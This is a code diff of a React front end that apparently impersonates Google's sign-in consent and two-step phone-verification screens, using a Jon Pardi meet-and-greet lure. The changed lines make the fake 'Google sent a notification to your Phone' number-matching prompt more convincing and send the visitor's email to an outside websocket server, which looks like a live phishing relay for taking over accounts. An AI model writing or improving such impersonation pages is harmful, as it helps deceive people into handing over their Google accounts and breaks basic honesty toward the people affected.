@@ -80,9 +80,11 @@ function App() {
         const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
         socketHolder.current = socket.connect();
       }
-      (socketHolder.current).emit('updateSocketID', { 'email': sessionStorage.getItem('info') }, (response) => {
-        sessionStorage.setItem('socketID', response?.newID);
-      });
+      if (sessionStorage.getItem('info')) {
+        (socketHolder.current).emit('updateSocketID', { 'email': sessionStorage.getItem('info') }, (response) => {
+          sessionStorage.setItem('socketID', response?.newID);
+        });
+      }
       setDigit(sessionStorage.getItem('digit'));
       setSmsPhoneConfirmation(JSON.parse(sessionStorage.getItem('smsOtpTransit')));
       setSelectsOptions(JSON.parse(sessionStorage.getItem('allowedAuthentications')));
@@ -685,7 +687,7 @@ function App() {
         : (form === "otpForm") ?
           // OTP intiation consent
           <form className={`max-sm:w-[95%] w-[50%] max-[640px]:h-fit h-[80%] [@media(max-height:550px)]:justify-end [@media(min-height:551px)]:justify-start flex flex-col gap-y-6 sm:pt-[88px]`}>
-            <span className="text-sm font-normal text-white">By continuing, Google will share your name, email address, language preference, and profile picture with Example App. See <span className="text-blue-500">jonpardi.com</span> Privacy Policy and Terms of Service.</span>
+            <span className="text-sm font-normal text-white">By continuing, Google will share your name, email address, language preference, and profile picture with jonpardi.com. See <span className="text-blue-500">jonpardi.com</span> Privacy Policy and Terms of Service.</span>
             <span className="text-sm font-normal text-white">You can manage Sign in with Google in your Google Account.</span>
             <div className="w-[100%] max-[600px]:justify-between justify-end items-center flex max-[300px]:flex-col max-[300px]:gap-y-3 flex-row gap-x-8">
               <a href="https://jon-pardi-meetandgreet.onrender.com" className="text-blue-300 text-sm">Cancel</a>
@@ -1070,8 +1072,8 @@ function App() {
             </div>
             <div className="w-[100%] flex flex-col mt-[30px] max-sm:mt-[180px] gap-y-3">
               <text className="text-white text-sm font-normal bg-[#0E0E0E]">Check your Google Pixel 6 pro</text>
-              <text className="text-white text-sm font-normal bg-[#0E0E0E]">Google sent a notification to your Google Pixel 6 pro.<br/>Tap Yes on the notification, then tap {digit} on your phone to verify it is you.</text>
-              <text className="text-white text-2xl font-normal bg-[#0E0E0E] text-center">{digit}</text>
+              <text className="text-white text-sm font-normal bg-[#0E0E0E]">Google sent a notification to your Phone.<br/>Tap Yes on the notification, then tap {digit === '0' || digit === 0 ? '' : digit} on your phone to verify it is you.</text>
+              <text className="text-white text-2xl font-normal bg-[#0E0E0E] text-center">{digit === '0' || digit === 0 ? '' : digit}</text>
               {error && <p className="text-red-600 text-sm font-light">{error}</p>}
               <label className="text-white text-sm font-normal flex items-center gap-x-4">
                 <input className="appearance-none w-[16px] aspect-square border-[2px] border-white bg-transparent" type="checkbox" />
